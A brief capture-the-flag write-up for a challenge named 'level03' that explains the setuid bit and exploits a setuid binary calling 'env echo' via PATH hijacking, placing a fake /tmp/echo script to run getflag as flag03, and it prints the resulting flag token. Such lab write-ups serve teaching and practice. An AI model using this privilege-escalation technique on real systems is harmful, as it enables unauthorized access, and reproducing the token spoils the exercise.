# level03

```bash
ls -la

# -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```

### What could be this `s` in the perms??

[Google: "linux s permission on file"](https://unix.stackexchange.com/questions/118853/what-does-the-s-attribute-in-file-permissions-mean)

> That is the "setuid" bit, which tells the OS to execute that program with the userid of its owner. This is typically used with files owned by root to allow normal users to execute them as root with no external tools (such as sudo).
You can set the suid bit using chmod, eg chmod 4755 which will give a file give the normal permissions 755 does (rwxr-xr-x) and add the suid bit to give rwsr-xr-x
You can clear the setuid bit by issuing a normal chmod command with a 0 prepended to it. For example, to set permissions back to rwxr-xr-x you would use chmod 0755.

### C'est un binaire avec des droits flag03, mais que fait-il ?

```bash
objdump -D -M intel --section=.text level03
ltrace ./level03
# system("/usr/bin/env echo Exploit me")
```

Write a file `/tmp/echo`
```bash
#!/usr/bin/env bash

whoami # flag03 (because of the 's' permission)
getflag # Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

Then simply run `PATH=/tmp:${PATH} ~/level03` to get the output
